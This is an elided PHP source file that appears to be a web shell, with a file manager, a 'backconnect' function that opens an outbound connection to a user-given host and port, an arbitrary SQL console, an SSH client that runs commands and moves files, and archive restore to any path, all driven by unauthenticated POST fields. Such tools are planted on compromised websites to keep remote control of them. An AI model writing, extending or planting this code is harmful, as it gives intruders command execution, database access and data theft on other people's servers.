    ...
    switch($bulk_action) {
        ...
        case 'zip':
            if (!empty($bulk_selected)) {
                $zipname = $dir . DIRECTORY_SEPARATOR . "bulk_archive.zip"; // REMOVED TIMESTAMP
                $zip = new ZipArchive;
...
/* ----------------- NEW: BACKCONNECT FUNCTION ----------------- */
function backconnect($host, $port, $timeout = 10) {
...
class DatabaseManager {
    ...
    public function connect($type, $host, $user, $pass, $dbname = '') {
        try {
            switch(strtolower($type)) {
                ...
                case 'pgsql':
                    $dsn = $dbname ? "pgsql:host=$host;dbname=$dbname" : "pgsql:host=$host";
                ...
                case 'sqlite':
                    ...
                    return "Connected to SQLite successfully";
    ...
    public function query($sql) {
        if(!$this->connection) return "No database connection";
        
        try {
            if($this->connection instanceof mysqli) {
                $result = $this->connection->query($sql);
                if($result === true) return "Query executed successfully";
                if($result === false) return "MySQL Error: " . $this->connection->error;
                ...
                if($stmt === false) return "PDO Error";
    ...
    public function getTables() {
        ...
        if($this->connection instanceof mysqli) {
            ...
            $stmt = $this->connection->query("SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE()");
...
/* ----------------- NEW: BACKUP SYSTEM ----------------- */
class BackupSystem {
    public function createBackup($source, $backupName = '') {
        if(empty($backupName)) {
            $backupName = 'backup_' . date('Y-m-d_H-i-s') . '.zip';
        }
        
        $backupPath = dirname($source) . DIRECTORY_SEPARATOR . $backupName;
        ...
        $zip->close();
        return "Backup created: " . basename($backupPath) . " (" . hfs(filesize($backupPath)) . ")";
    }
    
    public function restoreBackup($backupFile, $destination) {
        ...
        if($zip->open($backupFile) !== TRUE) {
            return "Failed to open backup archive";
        }
        
        $zip->extractTo($destination);
        $zip->close();
        
        return "Backup restored to: " . $destination;
    }
    
    public function listBackups($directory) {
        $backups = [];
        if(is_dir($directory)) {
            foreach(scandir($directory) as $file) {
                if(preg_match('/\.(zip|tar|gz|sql)$/i', $file)) {
                    $backups[] = [
                        'name' => $file,
                        'size' => filesize($directory . DIRECTORY_SEPARATOR . $file),
                        'modified' => date('Y-m-d H:i:s', filemtime($directory . DIRECTORY_SEPARATOR . $file))
                    ];
                }
            }
        }
...
class SSHClient {
    ...
    public function connect($host, $port = 22, $username, $password) {
    ...
    public function disconnect() {
        if($this->connection) {
            // SSH2 doesn't have explicit close function
            $this->connection = null;
        }
        return "Disconnected";
    }
...
if(isset($_POST['db_action'])) {
    switch($_POST['db_action']) {
        case 'connect':
            ...
            break;
        case 'query':
            $db_result = $db_manager->query($_POST['db_query']);
            break;
        case 'tables':
            $db_result = $db_manager->getTables();
            break;
        case 'disconnect':
            $db_result = $db_manager->disconnect();
            break;
    }
}

// Backup System Handler
$backup_system = new BackupSystem();
$backup_result = '';
if(isset($_POST['backup_action'])) {
    switch($_POST['backup_action']) {
        case 'create':
            $backup_result = $backup_system->createBackup($dir, $_POST['backup_name'] ?? '');
            break;
        case 'restore':
            $backup_result = $backup_system->restoreBackup(
                $_POST['backup_file'] ?? '',
                $_POST['restore_path'] ?? $dir
            );
            break;
        case 'list':
            $backup_result = $backup_system->listBackups($dir);
            break;
    }
}
...
if(isset($_POST['ssh_action'])) {
    switch($_POST['ssh_action']) {
        case 'connect':
            ...
            break;
        case 'execute':
            $ssh_result = $ssh_client->execute($_POST['ssh_command']);
            break;
        case 'upload':
            $ssh_result = $ssh_client->upload(
                $_POST['ssh_local_file'],
                $_POST['ssh_remote_file']
            );
            break;
        case 'download':
            $ssh_result = $ssh_client->download(
                $_POST['ssh_remote_file'],
                $_POST['ssh_local_file']
            );
            break;
        case 'disconnect':
            $ssh_result = $ssh_client->disconnect();
            break;
    }
}
...
// Backconnect Handler
$backconnect_result = '';
if(isset($_POST['backconnect_action'])) {
    $host = $_POST['bc_host'] ?? '';
    $port = $_POST['bc_port'] ?? 80;
    $timeout = $_POST['bc_timeout'] ?? 10;
    
    if(!empty($host)) {
        $backconnect_result = backconnect($host, $port, $timeout);
    }
}
...
$show_backup = isset($_GET['show_backup']);
...
<?php unset($_SESSION['url_upload_success']); endif; ?>
    ...
    <div class="controls">
      ...
      <div style="display:flex;gap:8px;flex-wrap:wrap">
        ...
        <a href="?dir=<?=urlencode($dir)?>&show_backconnect=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#8b0000,#ff0000)">
        ...
        <a href="?dir=<?=urlencode($dir)?>&show_ssh=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#006400,#00a000)">
            <span class="ico">🖥️</span> SSH/SFTP
          </button>
        </a>
        ...
        <a href="?dir=<?=urlencode($dir)?>&show_backup=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#8b4513,#d2691e)">
...
<div class="popup-overlay" id="backconnectPopup">
  <div class="popup-content" style="width:700px">
    <div class="popup-header">
      <h4>🔗 Backconnect Tool</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <p style="margin:0 0 12px 0;color:var(--muted);font-size:13px">
        Test connectivity to remote hosts/ports:
      </p>
      
      <form method="POST">
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px">
          <div>
            <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Host/IP Address</label>
            <input type="text" name="bc_host" class="input" placeholder="example.com or 192.168.1.1" required>
          </div>
          <div>
            <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Port</label>
            <input type="number" name="bc_port" class="input" value="80" min="1" max="65535">
          </div>
        </div>
        
        <div style="margin-bottom:12px">
          <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Timeout (seconds)</label>
          <input type="number" name="bc_timeout" class="input" value="10" min="1" max="60">
        </div>
        
        <input type="hidden" name="backconnect_action" value="test">
        <button type="submit" class="btn-neon" style="width:100%">Test Connection</button>
      </form>
      
      <?php if(!empty($backconnect_result)): ?>
      <div style="margin-top:14px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Result:</strong>
        <div style="margin-top:8px;max-height:200px;overflow:auto;font-family:monospace;font-size:12px;color:#cdefff;background:#040408;padding:8px;border-radius:4px">
          <?=esc($backconnect_result)?>
        </div>
      </div>
      <?php endif; ?>
      
      <div style="margin-top:12px;padding:10px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan);font-size:13px">Common Ports:</strong>
        <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:6px">
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setBackconnect('example.com', 80)">HTTP (80)</button>
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setBackconnect('example.com', 443)">HTTPS (443)</button>
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setBackconnect('example.com', 22)">SSH (22)</button>
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setBackconnect('example.com', 21)">FTP (21)</button>
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setBackconnect('example.com', 3306)">MySQL (3306)</button>
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setBackconnect('example.com', 5432)">PostgreSQL (5432)</button>
        </div>
      </div>
    </div>
  </div>
...
<div class="popup-overlay" id="sshPopup">
  <div class="popup-content" style="width:800px">
    <div class="popup-header">
      <h4>🖥️ SSH/SFTP Client</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <?php if(!function_exists('ssh2_connect')): ?>
      <div style="padding:12px;background:linear-gradient(90deg,#ff5f7a,#ff9fb4);border-radius:8px;margin-bottom:12px">
        ⚠️ SSH2 extension is not installed/enabled. Install php-ssh2 package.
      </div>
      <?php endif; ?>
      ...
      <form method="POST">
        <div style="display:grid;grid-template-columns:repeat(2, 1fr);gap:12px;margin-bottom:12px">
          <div>
            <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Host</label>
            <input type="text" name="ssh_host" class="input" placeholder="192.168.1.1" required>
          </div>
          <div>
            <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Port</label>
            <input type="number" name="ssh_port" class="input" value="22" min="1" max="65535">
          </div>
          <div>
          ...
          <div>
            <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Password</label>
            <input type="password" name="ssh_pass" class="input" placeholder="password" required>
          </div>
        </div>
        
        <div style="display:flex;gap:8px;margin-bottom:12px">
          <button type="submit" name="ssh_action" value="connect" class="btn-neon" style="flex:1">Connect</button>
          <button type="submit" name="ssh_action" value="disconnect" class="action-btn" style="background:linear-gradient(90deg,#666,#999);flex:1">Disconnect</button>
        </div>
      </form>
      
      <?php if(!empty($ssh_result)): ?>
      <div style="margin-top:14px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">SSH Result:</strong>
        <div style="margin-top:8px;max-height:150px;overflow:auto;font-family:monospace;font-size:12px;color:#cdefff;background:#040408;padding:8px;border-radius:4px">
          <?=esc($ssh_result)?>
        </div>
      </div>
      <?php endif; ?>
      ...
      <div style="margin-top:14px">
        <form method="POST">
          <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Execute Command</label>
          <div style="display:flex;gap:8px">
            <input type="text" name="ssh_command" class="input" placeholder="ls -la" required>
            <input type="hidden" name="ssh_host" value="<?=esc($_POST['ssh_host'] ?? '')?>">
            <input type="hidden" name="ssh_user" value="<?=esc($_POST['ssh_user'] ?? '')?>">
            <input type="hidden" name="ssh_pass" value="<?=esc($_POST['ssh_pass'] ?? '')?>">
            <button type="submit" name="ssh_action" value="execute" class="btn-neon">Execute</button>
          </div>
        </form>
      </div>
      ...
      <div style="margin-top:12px;padding:10px;background:rgba(0,0,0,0.2);border-radius:8px">
        ...
        <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:6px">
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setSSHCommand('pwd')">pwd</button>
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setSSHCommand('ls -la')">ls -la</button>
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setSSHCommand('df -h')">df -h</button>
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setSSHCommand('free -h')">free -h</button>
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setSSHCommand('whoami')">whoami</button>
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setSSHCommand('uname -a')">uname -a</button>
        </div>
      </div>
    </div>
  </div>
  ...
  <div class="popup-content" style="width:800px">
    ...
    <div class="popup-body">
      <form method="POST">
        <div style="display:grid;grid-template-columns:repeat(2, 1fr);gap:12px;margin-bottom:12px">
          <div>
            <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Database Type</label>
            <select name="db_type" class="input" required>
          ...
          <div>
            <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Host</label>
            <input type="text" name="db_host" class="input" placeholder="localhost" required>
          </div>
          <div>
            <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Database Name</label>
            <input type="text" name="db_name" class="input" placeholder="database_name">
          </div>
          <div>
            <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Username</label>
            <input type="text" name="db_user" class="input" placeholder="root" required>
          </div>
        ...
        <div style="display:flex;gap:8px;margin-bottom:12px">
          <button type="submit" name="db_action" value="connect" class="btn-neon" style="flex:1">Connect</button>
          <button type="submit" name="db_action" value="tables" class="action-btn" style="flex:1">Show Tables</button>
          <button type="submit" name="db_action" value="disconnect" class="action-btn" style="background:linear-gradient(90deg,#666,#999);flex:1">Disconnect</button>
        </div>
      </form>
      
      <?php if(!empty($db_result)): ?>
      <div style="margin-top:14px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Database Result:</strong>
        <div style="margin-top:8px;max-height:200px;overflow:auto;font-family:monospace;font-size:12px;color:#cdefff;background:#040408;padding:8px;border-radius:4px">
          <?php 
          if(is_array($db_result)) {
              echo "<table style='width:100%;border:none;font-size:11px'>";
              if(count($db_result) > 0 && is_array($db_result[0])) {
                  // Show table with headers
                  echo "<tr>";
                  foreach(array_keys($db_result[0]) as $col) {
                      echo "<th style='border-bottom:1px solid rgba(255,255,255,0.1);padding:4px'>" . esc($col) . "</th>";
                  }
                  echo "</tr>";
                  ...
                  foreach($db_result as $row) {
                      echo "<tr>";
                      foreach($row as $cell) {
                          echo "<td style='padding:4px;border-bottom:1px solid rgba(255,255,255,0.05)'>" . esc($cell) . "</td>";
                      }
                      echo "</tr>";
                  }
              } else {
      ...
      <div style="margin-top:14px">
        <form method="POST">
          <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">SQL Query</label>
          <div style="display:flex;gap:8px;margin-bottom:4px">
            <input type="text" name="db_query" class="input" placeholder="SELECT * FROM users" required>
            <input type="hidden" name="db_type" value="<?=esc($_POST['db_type'] ?? 'mysql')?>">
            <input type="hidden" name="db_host" value="<?=esc($_POST['db_host'] ?? '')?>">
            <input type="hidden" name="db_user" value="<?=esc($_POST['db_user'] ?? '')?>">
            <input type="hidden" name="db_pass" value="<?=esc($_POST['db_pass'] ?? '')?>">
            <input type="hidden" name="db_name" value="<?=esc($_POST['db_name'] ?? '')?>">
            <button type="submit" name="db_action" value="query" class="btn-neon">Execute</button>
          </div>
        </form>
      </div>
      
      <div style="margin-top:12px;padding:10px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan);font-size:13px">Common Queries:</strong>
        <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:6px">
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setDBQuery('SHOW TABLES')">SHOW TABLES</button>
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setDBQuery('SELECT version()')">VERSION</button>
          <button type="button" class="action-btn" style="padding:6px 10px;font-size:12px" onclick="setDBQuery('SELECT DATABASE()')">CURRENT DB</button>
        </div>
      </div>
    </div>
  </div>
...
<!-- Backup System Popup -->
<?php if (isset($_GET['show_backup'])): ?>
<div class="popup-overlay" id="backupPopup">
  <div class="popup-content" style="width:700px">
    <div class="popup-header">
      <h4>💾 Backup & Restore System</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <div style="margin-bottom:14px">
        <strong style="color:var(--neon-cyan)">Current Directory:</strong> <?=esc($dir)?>
      </div>
      
      <!-- Create Backup Form -->
      <form method="POST" style="margin-bottom:20px;padding:12px;background:rgba(0,0,0,0.15);border-radius:8px">
        <strong style="color:var(--neon-cyan);display:block;margin-bottom:8px">Create Backup</strong>
        <div style="display:flex;gap:8px">
          <input type="text" name="backup_name" class="input" placeholder="backup_name.zip (leave empty for auto)">
          <input type="hidden" name="backup_action" value="create">
          <button type="submit" class="btn-neon">Create Backup</button>
        </div>
        <div style="margin-top:6px;font-size:12px;color:var(--muted)">
          Backup will include all files in current directory.
        </div>
      </form>
      
      <!-- Restore Backup Form -->
      <form method="POST" style="margin-bottom:20px;padding:12px;background:rgba(0,0,0,0.15);border-radius:8px">
        <strong style="color:var(--neon-cyan);display:block;margin-bottom:8px">Restore Backup</strong>
        <div style="display:flex;gap:8px;margin-bottom:8px">
          <input type="text" name="backup_file" class="input" placeholder="/path/to/backup.zip" required>
          <input type="text" name="restore_path" class="input" placeholder="Restore to path" value="<?=esc($dir)?>">
        </div>
        <input type="hidden" name="backup_action" value="restore">
        <button type="submit" class="btn-neon" style="width:100%">Restore Backup</button>
      </form>
      
      <!-- List Backups -->
      <form method="POST">
        <input type="hidden" name="backup_action" value="list">
        <button type="submit" class="action-btn" style="width:100%">List Available Backups</button>
      </form>
      
      <?php if(!empty($backup_result)): ?>
      <div style="margin-top:14px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Backup Result:</strong>
        <div style="margin-top:8px;max-height:200px;overflow:auto;font-family:monospace;font-size:12px;color:#cdefff;background:#040408;padding:8px;border-radius:4px">
          <?php 
          if(is_array($backup_result)) {
              if(count($backup_result) > 0) {
                  echo "<table style='width:100%;border:none;font-size:11px'>";
                  echo "<tr><th>Name</th><th>Size</th><th>Modified</th></tr>";
                  foreach($backup_result as $backup) {
                      echo "<tr>";
                      echo "<td>" . esc($backup['name']) . "</td>";
                      echo "<td>" . hfs($backup['size']) . "</td>";
                      echo "<td>" . esc($backup['modified']) . "</td>";
                      echo "</tr>";
                  }
                  echo "</table>";
              } else {
      ...
      <div style="margin-top:12px;padding:10px;background:rgba(0,0,0,0.2);border-radius:8px">
        ...
        <ul style="margin:8px 0 0 0;padding-left:18px;color:var(--muted);font-size:12px">
          <li>Backups are created as ZIP files</li>
          <li>Restore will extract to specified directory</li>
          <li>Check file permissions for backup/restore operations</li>
          <li>Large directories may take time to backup</li>
        </ul>
      </div>
    </div>
  </div>
    ...
    <div class="popup-body">
      ...
      <div class="popup-grid">
        ...
        <button class="popup-btn" onclick="bulkActionPopup('zip')">
          📦<br><strong>Create Zip</strong><br><small>bulk_archive.zip</small>
        </button>
...
function setBackconnect(host, port) {
    document.querySelector('input[name="bc_host"]').value = host;
    document.querySelector('input[name="bc_port"]').value = port;
}

// ==================== SSH FUNCTIONS ====================

function setSSHCommand(cmd) {
    document.querySelector('input[name="ssh_command"]').value = cmd;
}

// ==================== DATABASE FUNCTIONS ====================

function setDBQuery(query) {
    document.querySelector('input[name="db_query"]').value = query;
}
